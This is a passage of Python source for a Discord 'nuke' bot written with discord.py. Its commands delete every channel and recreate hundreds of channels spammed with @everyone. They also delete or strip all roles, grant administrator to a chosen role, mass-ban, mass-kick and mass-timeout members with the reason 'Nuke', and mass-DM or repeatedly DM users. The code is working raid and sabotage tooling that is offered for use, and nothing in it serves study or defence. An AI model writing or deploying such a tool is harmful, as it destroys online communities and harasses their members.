        [("Channels hidden", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def showall(ctx):
    count = len(ctx.guild.channels)
    await batch([ch.set_permissions(ctx.guild.default_role, view_channel=True)
                 for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "showall")
    await _log_embed(_action_embed("👁️ Showed All Channels", 0x57f287,
        [("Channels shown", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def slowall(ctx, seconds: int):
    count = len(ctx.guild.text_channels)
    await batch([ch.edit(slowmode_delay=seconds) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, f"slowall {seconds}s")
    await _log_embed(_action_embed("⏱️ Slowmode Set on All Channels", 0xffa500,
        [("Delay", f"{seconds}s", True), ("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def nsfwall(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.edit(nsfw=True) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "nsfwall")
    await _log_embed(_action_embed("🔞 Marked All Channels NSFW", 0xff0000,
        [("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unnsfwall(ctx):
    count = len(ctx.guild.text_channels)
    await batch([ch.edit(nsfw=False) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "unnsfwall")
    await _log_embed(_action_embed("✅ Unmarked NSFW on All Channels", 0x57f287,
        [("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def topicall(ctx, *, topic: str):
    count = len(ctx.guild.text_channels)
    await batch([ch.edit(topic=topic) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "topicall")
    await _log_embed(_action_embed("📝 Set Topic on All Channels", 0x00b0f4,
        [("Topic", topic[:200], False), ("Channels", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def delpins(ctx):
    pins = await ctx.channel.pins()
    await batch([msg.unpin() for msg in pins], **BATCH_MSG)
    await status(ctx, "delpins")
    await _log_embed(_action_embed("📌 Deleted Pins", 0xff0000,
        [("Channel", f"#{ctx.channel.name}", True), ("Pins removed", len(pins), True)]))

@bot.command()
async def delpinsall(ctx):
    total = 0
    async def unpin_all(ch):
        nonlocal total
        pins = await safe(ch.pins())
        if pins:
            total += len(pins)
            for msg in pins:
                await safe(msg.unpin())
    await batch([unpin_all(ch) for ch in ctx.guild.text_channels], **BATCH_CH)
    await status(ctx, "delpinsall")
    await _log_embed(_action_embed("📌 Deleted All Pins", 0xff0000,
        [("Total removed", total, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def clonech(ctx, channel: discord.TextChannel, count: int):
    await batch([channel.clone() for _ in range(count)], **BATCH_CH)
    await status(ctx, f"clonech {channel.name} x{count}")
    await _log_embed(_action_embed("📋 Channel Cloned", 0x00b0f4,
        [("Source", f"#{channel.name}", True), ("Copies", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def channelinfo(ctx):
    lines = [f"`{ch.id}` — #{ch.name} ({type(ch).__name__})" for ch in ctx.guild.channels]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def movech(ctx, channel: discord.TextChannel, category: discord.CategoryChannel):
    await channel.edit(category=category)
    await status(ctx, f"movech #{channel.name} → {category.name}")
    await _log_embed(_action_embed("📁 Channel Moved", 0x00b0f4,
        [("Channel", f"#{channel.name}", True), ("Category", category.name, True)]))

@bot.command()
async def cloneall(ctx):
    count = len(ctx.guild.channels)
    await batch([ch.clone() for ch in ctx.guild.channels], **BATCH_CH)
    await status(ctx, "cloneall")
    await _log_embed(_action_embed("📋 Cloned All Channels", 0x00b0f4,
        [("Channels cloned", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def archivech(ctx, channel: discord.TextChannel):
    archive_cat = discord.utils.get(ctx.guild.categories, name="Archive")
    if not archive_cat:
        archive_cat = await ctx.guild.create_category("Archive")
    await channel.edit(category=archive_cat)
    await status(ctx, f"archivech #{channel.name}")
    await _log_embed(_action_embed("🗄️ Channel Archived", 0x9b59b6,
        [("Channel", f"#{channel.name}", True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def vcbitrate(ctx, channel: discord.VoiceChannel, bitrate: int):
    bps = max(8000, min(bitrate, 96000))
    await channel.edit(bitrate=bps)
    await status(ctx, f"vcbitrate #{channel.name} {bps}")
    await _log_embed(_action_embed("🔊 VC Bitrate Set", 0x00b0f4,
        [("Channel", f"#{channel.name}", True), ("Bitrate", f"{bps} bps", True)]))

@bot.command()
async def vcbitrateall(ctx, bitrate: int):
    bps = max(8000, min(bitrate, 96000))
    count = len(ctx.guild.voice_channels)
    await batch([ch.edit(bitrate=bps) for ch in ctx.guild.voice_channels], **BATCH_CH)
    await status(ctx, f"vcbitrateall {bps}")
    await _log_embed(_action_embed("🔊 Bitrate Set on All VCs", 0x00b0f4,
        [("Bitrate", f"{bps} bps", True), ("VCs", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def vclimit(ctx, channel: discord.VoiceChannel, limit: int):
    lim = max(0, limit)
    await channel.edit(user_limit=lim)
    await status(ctx, f"vclimit #{channel.name} {lim}")
    await _log_embed(_action_embed("👥 VC User Limit Set", 0x00b0f4,
        [("Channel", f"#{channel.name}", True), ("Limit", lim or "unlimited", True)]))

@bot.command()
async def vclimitall(ctx, limit: int):
    lim = max(0, limit)
    count = len(ctx.guild.voice_channels)
    await batch([ch.edit(user_limit=lim) for ch in ctx.guild.voice_channels], **BATCH_CH)
    await status(ctx, f"vclimitall {lim}")
    await _log_embed(_action_embed("👥 User Limit Set on All VCs", 0x00b0f4,
        [("Limit", lim or "unlimited", True), ("VCs", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def createinvite(ctx, channel: discord.TextChannel = None):
    ch = channel or ctx.channel
    invite = await ch.create_invite(max_age=0, max_uses=0, unique=True)
    await ctx.send(f"🔗 Permanent invite: {invite.url}")
    await _log_embed(_action_embed("🔗 Invite Created", 0x57f287,
        [("Channel", f"#{ch.name}", True), ("Link", invite.url, False)]))

@bot.command()
async def wipechat(ctx):
    await ctx.channel.purge(limit=None)
    await _log_embed(_action_embed("🧹 Chat Wiped", 0xff0000,
        [("Channel", f"#{ctx.channel.name}", True), ("Guild", ctx.guild.name, True)]))

# ─────────────────────────────────────────────
# NUKE
# ─────────────────────────────────────────────

@bot.command()
async def nuke(ctx, name: str, *, message: str = "@everyone"):
    global STOPPED
    STOPPED = False
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
    ch_sem = asyncio.Semaphore(5)
    async def nuke_one():
        async with ch_sem:
            if STOPPED:
                return
            ch = await safe(ctx.guild.create_text_channel(name))
            if not ch:
                return
        await asyncio.gather(*[safe(ch.send(message)) for _ in range(30)])
    await asyncio.gather(*[nuke_one() for _ in range(500)])
    await status(ctx, "nuke")
    await _log_embed(_action_embed("💥 NUKE EXECUTED", 0xff0000,
        [("Channel name", name, True), ("Message", message[:200], False), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def nukeall(ctx, *, name: str = "nuked"):
    await batch([ch.delete() for ch in ctx.guild.channels], **BATCH_CH)
    await batch([ctx.guild.create_text_channel(name) for _ in range(10)], **BATCH_CH)
    await status(ctx, f"nukeall {name}")
    await _log_embed(_action_embed("💥 Nuke All Executed", 0xff0000,
        [("New channel name", name, True), ("Guild", ctx.guild.name, True)]))

# ─────────────────────────────────────────────
# ROLES
# ─────────────────────────────────────────────

@bot.command()
async def mr(ctx, name: str, count: int):
    await batch([ctx.guild.create_role(name=name) for _ in range(count)], **BATCH_ROLE)
    await status(ctx, f"mr {name} x{count}")
    await _log_embed(_action_embed("🎭 Mass Created Roles", 0xffa500,
        [("Name", name, True), ("Count", count, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def dar(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.delete() for r in targets], **BATCH_ROLE)
    await status(ctx, "dar")
    await _log_embed(_action_embed("🗑️ Deleted All Roles", 0xff0000,
        [("Deleted", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def renameallr(ctx, *, name: str):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(name=name) for r in targets], **BATCH_ROLE)
    await status(ctx, f"renameallr {name}")
    await _log_embed(_action_embed("✏️ Renamed All Roles", 0xffa500,
        [("New name", name, True), ("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massrole(ctx, role: discord.Role):
    targets = [m for m in ctx.guild.members if not m.bot]
    await batch([m.add_roles(role) for m in targets], **BATCH_MBR)
    await status(ctx, f"massrole {role.name}")
    await _log_embed(_action_embed("➕ Mass Role Given", 0xffa500,
        [("Role", role.name, True), ("Members", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massremoverole(ctx, role: discord.Role):
    targets = [m for m in ctx.guild.members if role in m.roles]
    await batch([m.remove_roles(role) for m in targets], **BATCH_MBR)
    await status(ctx, f"massremoverole {role.name}")
    await _log_embed(_action_embed("➖ Mass Role Removed", 0xffa500,
        [("Role", role.name, True), ("Members affected", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def stripall(ctx):
    async def strip(m):
        removable = [r for r in m.roles if r != ctx.guild.default_role and r < ctx.guild.me.top_role]
        if removable:
            await m.remove_roles(*removable)
    targets = [m for m in ctx.guild.members if not m.bot]
    await batch([strip(m) for m in targets], **BATCH_MBR)
    await status(ctx, "stripall")
    await _log_embed(_action_embed("🗑️ Stripped All Roles", 0xff0000,
        [("Members affected", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def adminrole(ctx, role: discord.Role):
    await role.edit(permissions=discord.Permissions(administrator=True))
    await status(ctx, f"adminrole {role.name}")
    await _log_embed(_action_embed("👑 Admin Perms Given to Role", 0xffd700,
        [("Role", role.name, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def depermsall(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(permissions=discord.Permissions.none()) for r in targets], **BATCH_ROLE)
    await status(ctx, "depermsall")
    await _log_embed(_action_embed("🚫 Wiped All Role Permissions", 0xff0000,
        [("Roles affected", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def colorallr(ctx, hex_color: str):
    hex_color = hex_color.strip("#")
    try:
        color = discord.Color(int(hex_color, 16))
    except ValueError:
        await ctx.send("❌ Invalid hex color. Example: `!colorallr ff0000`")
        return
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(color=color) for r in targets], **BATCH_ROLE)
    await status(ctx, f"colorallr #{hex_color}")
    await _log_embed(_action_embed("🎨 Colored All Roles", int(hex_color, 16),
        [("Color", f"#{hex_color}", True), ("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def mentionallr(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(mentionable=True) for r in targets], **BATCH_ROLE)
    await status(ctx, "mentionallr")
    await _log_embed(_action_embed("🔔 All Roles Made Mentionable", 0xffa500,
        [("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unmentionallr(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(mentionable=False) for r in targets], **BATCH_ROLE)
    await status(ctx, "unmentionallr")
    await _log_embed(_action_embed("🔕 All Roles Made Unmentionable", 0xffa500,
        [("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def hoistallr(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(hoist=True) for r in targets], **BATCH_ROLE)
    await status(ctx, "hoistallr")
    await _log_embed(_action_embed("⬆️ All Roles Hoisted", 0xffa500,
        [("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unhoistallr(ctx):
    protected = {ctx.guild.default_role, ctx.guild.me.top_role}
    targets = [r for r in ctx.guild.roles if r not in protected]
    await batch([r.edit(hoist=False) for r in targets], **BATCH_ROLE)
    await status(ctx, "unhoistallr")
    await _log_embed(_action_embed("⬇️ All Roles Unhoisted", 0xffa500,
        [("Roles", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def listroles(ctx):
    lines = [f"`{r.id}` — @{r.name} ({len(r.members)} members)" for r in ctx.guild.roles]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def roleinfo(ctx, role: discord.Role):
    embed = discord.Embed(title=f"🎭 Role: {role.name}", color=role.color)
    embed.add_field(name="ID", value=str(role.id))
    embed.add_field(name="Color", value=str(role.color))
    embed.add_field(name="Members", value=str(len(role.members)))
    embed.add_field(name="Hoisted", value=str(role.hoist))
    embed.add_field(name="Mentionable", value=str(role.mentionable))
    embed.add_field(name="Position", value=str(role.position))
    embed.add_field(name="Created", value=role.created_at.strftime("%Y-%m-%d"))
    perms = [p for p, v in role.permissions if v]
    embed.add_field(name="Key Perms", value=", ".join(perms[:10]) or "none", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def cloner(ctx, role: discord.Role, *, name: str):
    new_role = await ctx.guild.create_role(
        name=name, permissions=role.permissions,
        color=role.color, hoist=role.hoist, mentionable=role.mentionable,
    )
    await ctx.send(f"✅ Cloned `{role.name}` → `{new_role.name}` (`{new_role.id}`)")
    await _log_embed(_action_embed("📋 Role Cloned", 0xffa500,
        [("Source", role.name, True), ("New role", new_role.name, True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def banrole(ctx, role: discord.Role):
    targets = [m for m in role.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.ban(reason=f"banrole: {role.name}") for m in targets], **BATCH_MBR)
    await status(ctx, f"banrole {role.name} ({len(targets)} members)")
    names = ", ".join(str(m) for m in targets[:20])
    await _log_embed(_action_embed("🔨 Banned by Role", 0xff0000,
        [("Role", role.name, True), ("Banned", len(targets), True),
         ("Members (first 20)", names or "none", False)]))

@bot.command()
async def kickrole(ctx, role: discord.Role):
    targets = [m for m in role.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.kick(reason=f"kickrole: {role.name}") for m in targets], **BATCH_MBR)
    await status(ctx, f"kickrole {role.name} ({len(targets)} members)")
    names = ", ".join(str(m) for m in targets[:20])
    await _log_embed(_action_embed("👢 Kicked by Role", 0xff0000,
        [("Role", role.name, True), ("Kicked", len(targets), True),
         ("Members (first 20)", names or "none", False)]))

# ─────────────────────────────────────────────
# MEMBERS
# ─────────────────────────────────────────────

@bot.command()
async def ban(ctx):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.ban(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, "ban")
    await _log_embed(_action_embed("🔨 Mass Ban", 0xff0000,
        [("Banned", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def kick(ctx):
    targets = [m for m in ctx.guild.members if m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.kick(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, "kick")
    await _log_embed(_action_embed("👢 Mass Kick", 0xff0000,
        [("Kicked", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def mban(ctx, count: int):
    targets = [m for m in ctx.guild.members
               if m != ctx.guild.me and m != ctx.guild.owner and not m.bot][:count]
    await batch([m.ban(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"mban {count}")
    names = ", ".join(str(m) for m in targets[:15])
    await _log_embed(_action_embed("🔨 Partial Mass Ban", 0xff0000,
        [("Requested", count, True), ("Banned", len(targets), True),
         ("Members", names or "none", False)]))

@bot.command()
async def mkick(ctx, count: int):
    targets = [m for m in ctx.guild.members
               if m != ctx.guild.me and m != ctx.guild.owner and not m.bot][:count]
    await batch([m.kick(reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"mkick {count}")
    names = ", ".join(str(m) for m in targets[:15])
    await _log_embed(_action_embed("👢 Partial Mass Kick", 0xff0000,
        [("Requested", count, True), ("Kicked", len(targets), True),
         ("Members", names or "none", False)]))

@bot.command()
async def massunban(ctx):
    bans = [entry async for entry in ctx.guild.bans()]
    await batch([ctx.guild.unban(entry.user) for entry in bans], **BATCH_MBR)
    await status(ctx, "massunban")
    await _log_embed(_action_embed("🔓 Mass Unban", 0x57f287,
        [("Unbanned", len(bans), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massdeafen(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(deafen=True) for m in members], **BATCH_MBR)
    await status(ctx, "massdeafen")
    await _log_embed(_action_embed("🔇 Mass Deafen", 0xff0000,
        [("Deafened", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massmute(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(mute=True) for m in members], **BATCH_MBR)
    await status(ctx, "massmute")
    await _log_embed(_action_embed("🔇 Mass Mute", 0xff0000,
        [("Muted", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def undeafenall(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(deafen=False) for m in members], **BATCH_MBR)
    await status(ctx, "undeafenall")
    await _log_embed(_action_embed("🔊 Mass Undeafen", 0x57f287,
        [("Undeafened", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def unmuteall(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.edit(mute=False) for m in members], **BATCH_MBR)
    await status(ctx, "unmuteall")
    await _log_embed(_action_embed("🔊 Mass Unmute", 0x57f287,
        [("Unmuted", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def massmove(ctx, channel: discord.VoiceChannel):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.move_to(channel) for m in members], **BATCH_MBR)
    await status(ctx, f"massmove {channel.name}")
    await _log_embed(_action_embed("🔀 Mass Voice Move", 0x00b0f4,
        [("To", f"#{channel.name}", True), ("Moved", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def voicekick(ctx):
    members = [m for m in ctx.guild.members if m.voice]
    await batch([m.move_to(None) for m in members], **BATCH_MBR)
    await status(ctx, "voicekick")
    await _log_embed(_action_embed("👢 Mass Voice Kick", 0xff0000,
        [("Disconnected", len(members), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def nickall(ctx, *, nick: str):
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me]
    await batch([m.edit(nick=nick) for m in targets], **BATCH_MBR)
    await status(ctx, f"nickall {nick}")
    await _log_embed(_action_embed("✏️ Mass Nickname Change", 0xffa500,
        [("New nick", nick, True), ("Members", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def resetnicks(ctx):
    targets = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.me and m.nick]
    await batch([m.edit(nick=None) for m in targets], **BATCH_MBR)
    await status(ctx, "resetnicks")
    await _log_embed(_action_embed("🔄 Mass Nick Reset", 0xffa500,
        [("Reset", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def timeoutall(ctx, minutes: int):
    until = discord.utils.utcnow() + datetime.timedelta(minutes=minutes)
    targets = [m for m in ctx.guild.members
               if not m.bot and m != ctx.guild.me and m != ctx.guild.owner]
    await batch([m.timeout(until, reason="Nuke") for m in targets], **BATCH_MBR)
    await status(ctx, f"timeoutall {minutes}m")
    await _log_embed(_action_embed("⏰ Mass Timeout", 0xff0000,
        [("Duration", f"{minutes} minutes", True), ("Members", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def untimeoutall(ctx):
    targets = [m for m in ctx.guild.members if m.is_timed_out()]
    await batch([m.timeout(None) for m in targets], **BATCH_MBR)
    await status(ctx, "untimeoutall")
    await _log_embed(_action_embed("✅ Mass Timeout Removed", 0x57f287,
        [("Removed from", len(targets), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def membercount(ctx):
    g = ctx.guild
    total = g.member_count
    bots = sum(1 for m in g.members if m.bot)
    humans = total - bots
    online = sum(1 for m in g.members if m.status != discord.Status.offline)
    embed = discord.Embed(title=f"👥 {g.name} — Member Count", color=0xff0000)
    embed.add_field(name="Total", value=str(total))
    embed.add_field(name="Humans", value=str(humans))
    embed.add_field(name="Bots", value=str(bots))
    embed.add_field(name="Online", value=str(online))
    await ctx.send(embed=embed)

@bot.command()
async def listbans(ctx):
    bans = [entry async for entry in ctx.guild.bans()]
    if not bans:
        await ctx.send("No banned users.")
        return
    lines = [f"`{e.user.id}` — {e.user} ({e.reason or 'No reason'})" for e in bans]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def userinfo(ctx, member: discord.Member):
    embed = discord.Embed(title=f"👤 {member}", color=member.color)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="ID", value=str(member.id))
    embed.add_field(name="Nickname", value=member.nick or "None")
    embed.add_field(name="Bot", value=str(member.bot))
    embed.add_field(name="Joined", value=member.joined_at.strftime("%Y-%m-%d %H:%M") if member.joined_at else "?")
    embed.add_field(name="Created", value=member.created_at.strftime("%Y-%m-%d %H:%M"))
    embed.add_field(name="Top Role", value=member.top_role.mention)
    embed.add_field(name="Roles", value=str(len(member.roles) - 1))
    embed.add_field(name="Status", value=str(member.status))
    embed.add_field(name="Timed Out", value=str(member.is_timed_out()))
    await ctx.send(embed=embed)

@bot.command()
async def banid(ctx, user_id: int):
    member = ctx.guild.get_member(user_id)
    if member:
        await safe(member.ban(reason="banid"))
        await status(ctx, f"banid {user_id}")
        await _log_embed(_action_embed("🔨 Ban by ID", 0xff0000,
            [("User", str(member), True), ("ID", str(user_id), True), ("Guild", ctx.guild.name, True)]))
    else:
        await ctx.send("❌ Member not found. Use `!hackban` for users not in server.")

@bot.command()
async def hackban(ctx, user_id: int):
    await ctx.guild.ban(discord.Object(id=user_id), reason="hackban")
    await status(ctx, f"hackban {user_id}")
    await _log_embed(_action_embed("🔨 Hackban", 0xff0000,
        [("User ID", str(user_id), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def softban(ctx, member: discord.Member):
    await member.ban(reason="softban", delete_message_days=7)
    await ctx.guild.unban(member)
    await status(ctx, f"softban {member}")
    await _log_embed(_action_embed("🪃 Softban", 0xffa500,
        [("User", str(member), True), ("ID", str(member.id), True), ("Guild", ctx.guild.name, True)]))

@bot.command()
async def joinedafter(ctx, days: int):
    cutoff = discord.utils.utcnow() - datetime.timedelta(days=days)
    recent = [m for m in ctx.guild.members if m.joined_at and m.joined_at > cutoff]
    if not recent:
        await ctx.send(f"No members joined in the last {days} days.")
        return
    lines = [f"`{m.id}` — {m} (joined {m.joined_at.strftime('%Y-%m-%d')})" for m in recent]
    text = "\n".join(lines)
    for chunk in [text[i:i+1900] for i in range(0, len(text), 1900)]:
        await safe(ctx.send(f"```\n{chunk}\n```"))

@bot.command()
async def jointime(ctx, member: discord.Member):
    joined = member.joined_at.strftime("%Y-%m-%d %H:%M:%S UTC") if member.joined_at else "Unknown"
    created = member.created_at.strftime("%Y-%m-%d %H:%M:%S UTC")
    await ctx.send(
        f"👤 **{member}**\nJoined server: `{joined}`\nAccount created: `{created}`"
    )

@bot.command()
async def massnick(ctx, role: discord.Role, *, nick: str):
    targets = [m for m in role.members if m != ctx.guild.me]
    await batch([m.edit(nick=nick) for m in targets], **BATCH_MBR)
    await status(ctx, f"massnick {role.name} → {nick}")
    await _log_embed(_action_embed("✏️ Mass Nick by Role", 0xffa500,
        [("Role", role.name, True), ("Nick", nick, True), ("Members", len(targets), True)]))

# ─────────────────────────────────────────────
# MASS DM  — all with per-result logging
# ─────────────────────────────────────────────

async def _dm_batch(targets: list, message: str | None = None,
                    embed: discord.Embed | None = None) -> tuple[int, int, list]:
    """DM a list of members. Returns (sent, failed, failed_list)."""
    sent = 0
    failed = 0
    failed_users = []

    async def send_one(m):
        nonlocal sent, failed
        try:
            if embed:
                await m.send(embed=embed)
            else:
                await m.send(message)
            sent += 1
        except Exception:
            failed += 1
            failed_users.append(str(m))

    await batch([send_one(m) for m in targets], **BATCH_MSG)
    return sent, failed, failed_users

async def _log_dm_result(ctx, label: str, sent: int, failed: int,
                         failed_users: list, extra_fields: list | None = None):
    """Send a clean DM result embed to the log channel."""
    fields = [
        ("✅ Sent", str(sent), True),
        ("❌ Failed", str(failed), True),
        ("Guild", ctx.guild.name, True),
    ]
    if extra_fields:
        fields.extend(extra_fields)
    if failed_users:
        fields.append(("Failed users (first 10)", ", ".join(failed_users[:10]), False))
    await _log_embed(_action_embed(label, 0xff69b4, fields))

@bot.command()
async def dmall(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"dmall — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM All", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def massdmrole(ctx, role: discord.Role, *, message: str):
    targets = [m for m in role.members if not m.bot]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmrole — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, f"📩 DM by Role: {role.name}", sent, failed, fl,
                         [("Role", role.name, True), ("Message", message[:200], False)])

@bot.command()
async def massdmnonrole(ctx, role: discord.Role, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot and role not in m.roles]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmnonrole — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, f"📩 DM Without Role: {role.name}", sent, failed, fl,
                         [("Excluded role", role.name, True), ("Message", message[:200], False)])

@bot.command()
async def massdmnew(ctx, days: int, *, message: str):
    cutoff = discord.utils.utcnow() - datetime.timedelta(days=days)
    targets = [m for m in ctx.guild.members if not m.bot and m.joined_at and m.joined_at > cutoff]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmnew — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, f"📩 DM New Members (<{days}d)", sent, failed, fl,
                         [("Days", days, True), ("Message", message[:200], False)])

@bot.command()
async def massdmids(ctx, ids: str, *, message: str):
    uid_list = [int(x.strip()) for x in ids.split(",") if x.strip().isdigit()]
    targets = [m for uid in uid_list if (m := ctx.guild.get_member(uid))]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmids — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM by ID List", sent, failed, fl,
                         [("IDs provided", len(uid_list), True), ("Message", message[:200], False)])

@bot.command()
async def massdmbots(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if m.bot and m != ctx.guild.me]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmbots — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM Bots", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def massdmoffline(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot and m.status == discord.Status.offline]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmoffline — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM Offline Members", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def massdmonline(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot and m.status == discord.Status.online]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmonline — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM Online Members", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def massdmnoavatar(ctx, *, message: str):
    targets = [m for m in ctx.guild.members if not m.bot and m.avatar is None]
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"massdmnoavatar — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM No-Avatar Members", sent, failed, fl,
                         [("Message", message[:200], False)])

@bot.command()
async def dmallroles(ctx, *, message: str):
    targets = list({m for r in ctx.guild.roles[1:] for m in r.members if not m.bot})
    sent, failed, fl = await _dm_batch(targets, message=message)
    await status(ctx, f"dmallroles — {sent} sent, {failed} failed")
    await _log_dm_result(ctx, "📩 DM All Role Holders", sent, failed, fl,
                         [("Unique targets", len(targets), True), ("Message", message[:200], False)])

@bot.command()
async def dmowner(ctx, *, message: str):
    owner = ctx.guild.owner
    sent, failed, fl = await _dm_batch([owner], message=message)
    await status(ctx, f"dmowner — {'sent' if sent else 'failed'}")
    await _log_dm_result(ctx, "📩 DM Owner", sent, failed, fl,
                         [("Owner", str(owner), True), ("Message", message[:200], False)])

@bot.command()
async def dmrepeat(ctx, member: discord.Member, count: int, *, message: str):
    sent = 0
    failed = 0
    for _ in range(count):
        try:
            await member.send(message)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(1.1)
    await status(ctx, f"dmrepeat {member} x{count} — {sent} sent, {failed} failed")
    await _log_embed(_action_embed("📩 DM Repeat", 0xff69b4, [
        ("User", str(member), True), ("Times", count, True),
